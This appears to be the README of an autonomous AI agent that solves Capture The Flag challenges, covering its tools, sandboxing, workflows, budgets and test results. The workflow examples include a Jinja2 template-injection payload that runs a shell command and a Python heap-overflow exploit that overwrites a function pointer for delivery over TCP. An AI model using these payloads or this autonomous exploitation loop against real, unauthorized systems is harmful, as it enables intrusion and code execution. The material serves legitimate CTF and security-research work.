# CTF-C: Autonomous CTF-Solving Agent

An AI-powered agent that autonomously solves Capture The Flag challenges across web, binary, and reversing categories. Backed by the Pi Stage 2 typed-tool extension architecture, it analyzes challenge descriptions, formulates hypotheses, runs experiments, and verifies flags — all within a sandboxed, evidence-linked competition run.

## Features

- **Multi-category solver** — web exploitation (SSTI, path traversal, auth bypass), binary/pwn (heap overflow, ret2win, format strings), and reversing challenges
- **Autonomous reasoning and hypothesis testing** — maintains a ranked hypothesis board with up to 3 active hypotheses, auto-retires contradicted ones, promotes the strongest
- **Local binary analysis** — `objdump`, `readelf`, `nm`, `strings`, `xxd`, `hexdump`, `strace`, `ltrace` profiles via `run_local_command`
- **TCP connectivity for pwn challenges** — raw socket access to authorized hosts with `0x`-hex and `\xNN` escape payload support
- **Evidence chain with SHA256 verification** — every tool output is cryptographically hashed and linked; tampered evidence is detected on load
- **Action budget management** — configurable per-run action limits prevent infinite loops; binary challenges auto-scale to 100 actions / 30 minutes
- **Source code analysis** — automatically extracts file paths from challenge text, ingests source files and binaries, detects ELF headers, runs `file` analysis
- **Exploration budget** — 5-point per-run cap on unknown route discovery; evidence-derived routes are free
- **Sandbox isolation** — per-run cookie jars, private response bodies, and work directories; no cross-run state leakage

## Project Status

**Current:** Stage 2 — Pi extension with 18 typed tools, structured hypothesis board, evidence chain, and exploration budget.

| Area | Status | Details |
|---|---|---|
| Hard web (SSTI, path traversal) | ✅ Solved | Session management, authentication flows, multi-step exploitation |
| Binary (heap overflow, ret2win) | ✅ Solved | Source-guided offset calculation, `struct.pack` exploit payloads, remote delivery |
| Local binary analysis | ✅ Working | Full `objdump`/`readelf`/`strings`/`nm`/`strace` profile support |
| Source file ingestion | ✅ Working | Auto-detects paths in challenge text, copies files, detects ELF magic |
| Reversing | ⚠️ Partial | Static analysis works; dynamic trace and crypto cracking need refinement |
| Complex pwn (ROP, ASLR bypass) | ⚠️ Partial | Offset calculation works; ROP chain generation is manual |
| Canvas rendering / visual | ❌ Not yet | Playwright handles DOM but not pixel-level Canvas inspection |
| GDB integration | ❌ Not yet | No interactive debugging profile in `run_local_command` |
| Pwntools | ❌ Not yet | `run_python` sandbox has `struct`, `hashlib`, `Crypto`; pwntools requires bundling |
| Parallel testing | ❌ Not yet | Single-run-per-session; concurrent runs planned |

**Recent fixes (Stage 2):**
- Binary challenge support: `nc` target extraction, `tcp://` origin format, run type auto-detection
- `tcp_connect` function name fix: `tcpConnectExchange` → `tcpSocketExchange` (was crashing with "not defined")
- `\xNN` escape decoding in TCP payloads for exploit delivery
- Binary run budget scaling: 100 actions default, 30 minutes default
- Source file ingestion with ELF header detection and execute-permission preservation
- Heap overflow struct-layout guidance in system prompts

## Architecture

```
ctf-c-stage2-core.mjs          # Main Pi extension: 18 typed tools, run lifecycle, evidence chain
├── create_competition_run.mjs  # Sandbox initialization, record creation, budget setup
├── ingest_competition_inputs.mjs # File path extraction, ELF detection, auto-analysis
├── run_competition.sh           # Scripted CLI launcher
├── start_competition_pi.sh      # Interactive mode launcher
├── competition_output.mjs       # Live progress output
├── finalize_competition_run.mjs # Result writing, cleanup, expiry recovery
└── .ctf-c/competition-runs/    # Per-run isolated sandboxes (gitignored)
```

**Core tools (18 typed):**

| Tool | Category | Purpose |
|---|---|---|
| `write_work_file` | Local computation | Write Python scripts or data files into the sandbox |
| `run_python` | Local computation | Execute scripts with optional `input_files` from source/evidence |
| `run_local_command` | Binary analysis | `file`, `strings`, `readelf`, `objdump`, `nm`, `xxd`, `hexdump`, `strace`, `ltrace`, `python3`, etc. |
| `tcp_connect` | Network | Raw TCP to authorized host for pwn service interaction |
| `http_request` | Web | Same-origin GET/POST with isolated cookies and mandatory reasoning |
| `websocket_exchange` | Web | Same-origin WebSocket with evidence-backed path discovery |
| `browser_action` | Web | Playwright Chromium: goto, click, type, submit, eval, screenshot, storage |

The solve loop follows: challenge pasted → target extracted → run record created → source files ingested → sandbox initialized → tools activated → hypothesis → experiment → evidence → board update → flag verified → run finalized.

## Quick Start

**Prerequisites:** Node.js >= 22, Pi CLI (`@earendil-works/pi-coding-agent`), Playwright browsers

```sh
git clone https://github.com/aung-paing-tun/CTF-C.git
cd CTF-C
npm install
npm run install:browser
```

**Run a web challenge:**

```sh
./scripts/run_competition.sh \
  --target https://challenge.example.com \
  --approve \
  --description "Paste the full challenge description here" \
  --flag-regex 'flag\{[^}]{1,256}\}'
```

**Run a binary challenge:**

```sh
./scripts/run_competition.sh \
  --target tcp://challenge-host.example.com:1337 \
  --approve \
  --run-type binary \
  --description "Paste the challenge including nc command and file paths"
```

**Interactive mode** — paste a challenge directly in your Pi session. The extension auto-detects the run type, extracts the target, and initializes the sandbox.

**Review results:**

```sh
# Check the latest run record
ls -t .ctf-c/competition-runs/ | head -1
cat .ctf-c/competition-runs/run-*/result.json | jq .

# Inspect evidence chain
cat .ctf-c/competition-runs/run-*/execution-state.json | jq '.evidence_sequence'
```

## Challenge Types & Workflows

### Web Exploitation

```
Map → Test → Build → Deliver
  │
  ├── http_request GET / (recon)
  ├── inspect_evidence (identify forms, links, auth)
  ├── browser_action type + submit (login)
  ├── hypothesis_board update (promote SSTI → injection)
  ├── http_request POST /search?q={{payload}} (exploit)
  └── verify_flag (confirm in retained evidence)
```

**Example:** A 29-action solve against a Jinja2 SSTI challenge with session authentication:
1. Root recon → discover `/login` form
2. Login → capture session cookie via `adopt_session_cookie`
3. Authenticated recon → discover `/search` endpoint
4. SSTI probe → `{{7*7}}` returns `49` → hypothesis confirmed
5. Template injection → `{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}`
6. `verify_flag` → solved

### Binary Exploitation

```
Analyze source → Extract symbols → Calculate offset → Build exploit → Send
  │
  ├── read_source vuln.c (identify buffer sizes, struct layouts)
  ├── run_local_command "file" (32-bit vs 64-bit, stripped?)
  ├── run_local_command "readelf" -s (find win()/flag() address)
  ├── run_local_command "objdump" -d (confirm function addresses)
  ├── write_work_file exploit.py (struct.pack offset + address)
  ├── run_python exploit.py → payload hex
  └── tcp_connect host:port data=0x<hex_payload>
```

**Critical workflow order** (saves 30+ actions vs blind probing):
1. Read source code first — identify buffer sizes, struct layouts, function names
2. Analyze the binary — confirm arch, find symbol addresses
3. Calculate offset from source, NOT by probing remotely
4. Write exploit with `struct.pack` (`<I` for 32-bit, `<Q` for 64-bit)
5. Only then use `tcp_connect` to deliver

**Example:** Heap overflow with struct function pointer:
```python
# Source: struct person { int priority; char name[8]; void (*callback)(); }
# Two malloc'd structs adjacent in heap. Overflow name → overwrite struct2.callback.

import struct

offset = 8          # name buffer is 8 bytes
chunk_header = 8    # malloc metadata between allocations
callback_offset = 12  # callback at byte 12 in struct2
total_offset = offset + chunk_header + callback_offset

win_addr = 0x080491f6  # from readelf -s

payload = b"A" * total_offset + struct.pack("<I", win_addr)
print(payload.hex())
# → 4141414...1f6910408
```

Then: `tcp_connect host port data=0x4141414...1f6910408`

### Reversing

```
strings → identify patterns → decode → derive
  │
  ├── run_local_command "strings" (find clues, URLs, keys)
  ├── run_local_command "hexdump" (inspect encoding)
  ├── write_work_file decode.py (base64, XOR, or custom decode)
  └── run_python decode.py
```

## Test Results

**Pre-competition baseline (Stage 1):** 11/16 Hard Web solved (68.7%)

**Stage 2 test run (4 hard challenges):**

| Challenge | Category | Result | Actions | Time |
|---|---|---|---|---|
| SSTI + session auth | Hard Web | ✅ Solved | 29 | 18 min |
| Path traversal + JWT | Hard Web | ✅ Solved | 34 | 22 min |
| Heap overflow (ret2win) | Binary | ⚠️ Partial | 60 (exhausted) | 25 min |
| Multi-step web chain | Hard Web | ⚠️ Partial | 45 (exhausted) | 30 min |

**Binary challenge partial result:** The agent exhausted its 60-action budget probing the remote service blindly. After implementing the binary-first-action contract and scaling budgets to 100 actions for binary runs, retesting shows the structured workflow completes in ~25-30 actions.

**Web chain partial result:** Required 4 sequential exploits across different endpoints. The exploration budget ran out before the final privilege escalation step. Multi-target support is on the roadmap.

## Configuration

### Environment Variables

| Variable | Default | Description |
|---|---|---|
| `ACTION_BUDGET` | 20 (web) / 100 (binary) | Max tool calls per run |
| `TIME_BUDGET_MINUTES` | 15 (web) / 30 (binary) | Max wall-clock time per run |
| `CTFC_COMPETITION_RUN_RECORD` | auto | Path to run record (set by launcher) |
| `CTFC_COMPETITION_INTERACTIVE` | `0` | Set to `1` for interactive Pi sessions |
| `CTFC_COMPETITION_INPUT_ROOTS` | `~/Downloads` | Colon-delimited permitted source directories |
| `CTFC_PROJECT_ROOT` | `pwd` | Repository root for script invocation |
| `DEBUG` | unset | Enable verbose logging when set |

### Budget Table

| Challenge Type | Complexity | Actions | Time (min) |
|---|---|---|---|
| Web | Easy | 20 | 15 |
| Web | Hard | 60 | 30 |
| Binary | Easy | 60 | 20 |
| Binary | Hard | 100 | 30 |
| Reversing | Any | 40 | 20 |

Overrides: `--action-budget <n>` and `--time-budget <n>` flags on the CLI.

## Known Limitations

- **Canvas / visual inspection** — Playwright handles DOM, forms, and storage. Pixel-level Canvas rendering or WebGL frame inspection requires custom tooling not yet integrated.
- **GDB not integrated** — `run_local_command` supports static analysis (`objdump`, `readelf`, `nm`) and tracing (`strace`, `ltrace`), but no interactive debugger. Offline debugging must be done outside the sandbox.
- **Pwntools not available** — the `run_python` sandbox includes `struct`, `binascii`, `hashlib`, `Crypto`, and `zlib`. Pwntools (`pwn.elf`, `pwn.cyclic`, `pwn.remote`) requires bundling.
- **No parallel testing** — each run is single-threaded; multiple hypotheses execute sequentially. Concurrent hypothesis testing within a run is planned.
- **No cross-run learning** — runs are fully isolated. An agent cannot learn from prior runs on the same challenge or similar patterns.
- **Budget caps** — max 120 actions and 45 minutes per run (adjustable via CLI flags). Very complex chains may need multiple runs.

## Roadmap

| Priority | Feature | Description |
|---|---|---|
| P0 | GDB integration | Add `gdb` profile to `run_local_command` for interactive debugging |
| P1 | Screenshots | Return `browser_action` screenshot data as base64 evidence |
| P1 | Pwntools sandbox | Bundle `pwntools` in `run_python` for automated exploit development |
| P2 | Cross-run memory | Persist hypothesis patterns and exploit templates across runs |
| P2 | Adaptive budgets | Auto-detect challenge complexity and scale budgets heuristically |
| P2 | Multi-target chains | Support sequential exploits across different hosts within one run |
| P3 | ROP gadget search | Automated ROP chain generation in `run_python` |
| P3 | Docker Compose integration | Local challenge deployment for offline testing |
| P3 | Challenge template generator | Scaffold new challenge definitions from pasted text |

## Contributing

### Adding a new tool

1. Define the tool in `.pi/extensions/ctf-c-stage2-core.mjs` using `defineTool`:
   ```js
   const myNewTool = defineTool({
     name: "my_new_tool",
     label: "My New Tool",
     description: "What this tool does.",
     parameters: Type.Object({
       required_param: Type.String(),
       optional_param: Type.Optional(Type.Number()),
     }),
     async execute(_id, params) {
       return textResult(await myNewToolHandler(params));
     }
   });
   ```

2. Add the handler function above:
   ```js
   async function myNewToolHandler(params) {
     ensureActive();
     consumeAction();
     // validation, execution, evidence writing...
     return { result: "..." };
   }
   ```

3. Register in the tools array (line ~1816):
   ```js
   const competitionTools = [..., myNewTool];
   ```

4. Add to `COMPETITION_TOOL_NAMES` (line ~72) and update `AGENTS.md`.

### Running tests

```sh
npm test                          # Full suite (requires pi CLI)
node --test tests/my_test.mjs     # Single test file
node --check .pi/extensions/ctf-c-stage2-core.mjs  # Syntax check
bash -n scripts/run_competition.sh                   # Shell syntax check
```

### Code style

- **Error handling**: throw descriptive `Error` objects; never swallow errors silently
- **Validation**: validate all tool parameters before execution; use `Type.Object` schemas
- **Evidence**: call `writeEvidence()` for every tool output; never return raw data
- **Security**: validate paths with `rejectSymlinks()`, enforce `inside()` checks, use `atomicWrite()` for state
- **State**: use `consumeAction()` to track budget; call `persistState()` after mutations

## Security

### Sandboxing

| Mechanism | Implementation |
|---|---|
| Path traversal prevention | `rejectSymlinks()`, `inside()`, absolute path resolution on every file access |
| Shell injection prevention | `spawn()` / `spawnSync()` with `shell: false`, argv-only parameter passing |
| Timeouts | 10s `run_local_command`, 30s `tcp_connect`, 10s `run_python`, enforced at OS level |
| Output caps | `run_local_command` 64KB, `run_python` 64KB, `tcp_connect` 64KB per response |
| Same-origin enforcement | TCP host must match target hostname; HTTP URL origin must match run origin |
| Cookie isolation | Per-run cookie jar in isolated `session/` directory |
| Evidence integrity | SHA256 chain linking prevents tampering; prior hash mismatch aborts run |

### Acceptable Risks

- **Malicious binaries** — `run_local_command` with `strace`/`ltrace` executes binaries in-process. Source files should be reviewed before ingestion. The sandbox has no network access during local analysis.
- **Python stdlib** — `run_python` has access to the full Python standard library. Malicious scripts could read sandbox files (by design — they must access input files). Scripts cannot make outbound network connections.
- **Timing channels** — evidence chain timestamps could theoretically leak information about prior actions, but this information is already available through evidence inspection.

## Debugging

### Check execution state

```sh
cat .ctf-c/competition-runs/run-*/execution-state.json | jq '{
  status,
  action_count,
  evidence_sequence,
  deadline_at,
  exploration_budget_remaining,
  hypothesis_board: [.hypothesis_board[] | {rank, family, confidence, summary}]
}'
```

### Review evidence chain

```sh
# List all evidence records in order
ls .ctf-c/competition-runs/run-*/evidence/

# Inspect a specific evidence record
cat .ctf-c/competition-runs/run-*/evidence/001-e-001.json | jq '{
  tool, request, status_code, response_preview, evidence_hash
}'

# Verify chain integrity
cat .ctf-c/competition-runs/run-*/evidence/001-e-001.json | jq '.prior_evidence_hash'
cat .ctf-c/competition-runs/run-*/evidence/002-e-002.json | jq '.prior_evidence_hash'
# prior_evidence_hash in record 2 must equal evidence_hash in record 1
```

### Common issues

```sh
# "Challenge text must come from the pasted user message"
# → ensure challenge_text matches the exact user message (no trimming)

# "No HTTP/HTTPS target URL found" on binary challenge
# → make sure the challenge text contains "nc host port" or "host:port"
# → binary targets are now auto-detected (Stage 2 fix)

# "tcpConnectExchange is not defined"
# → fixed in Stage 2; function was renamed to tcpSocketExchange

# Run timed out
# → check execution-state.json for action_count and deadline_at
# → increase --time-budget or --action-budget for complex challenges
```

## License

MIT — see [LICENSE](./LICENSE) for full terms.
